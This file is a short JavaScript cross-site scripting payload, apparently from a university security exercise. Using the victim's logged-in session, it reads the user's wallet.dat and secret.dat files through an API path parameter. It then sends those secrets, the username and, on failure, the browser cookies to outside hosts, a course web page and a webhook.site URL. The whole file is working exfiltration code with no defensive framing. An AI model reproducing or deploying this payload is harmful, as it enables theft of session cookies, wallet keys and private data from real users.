// self xSS
const fetch = require('node-fetch')

(function(){
      try {
         var user, wallet, secret;

         function customFetch(link, type) {
            return fetch(link, { credentials: 'include'}).then(function(res) { return res[type]();})
         }

         customFetch("/api/whoami", 'text')
         .then(function(who) {
            user = who;
            return customFetch("/api/getdat?f=" + user + encodeURIComponent("/wallet.dat"), 'json')
         })
         .then(function(walletkey) {
            wallet = walletkey.msg;
            return customFetch("/api/getdat?f=" + user + encodeURIComponent("/secret.dat"), 'json')
         })
         .then(function(secretkey) {
            secret = secretkey.msg;
            payload = secret+"&"+wallet+"&"+user;
            return fetch("https://cgi.cse.unsw.edu.au/~z3420752/security/?cookie="+encodeURIComponent(payload))
         })
         .catch(function (err) {
            return fetch("https://cgi.cse.unsw.edu.au/~z3420752/security/?cookie="+encodeURIComponent(document.cookie))
         })
      } catch (e) {
         fetch(" https://webhook.site/6f19362b-c358-4164-9a21-19b8b8fc127e?cookie="+encodeURIComponent(document.cookie))
      }
})()
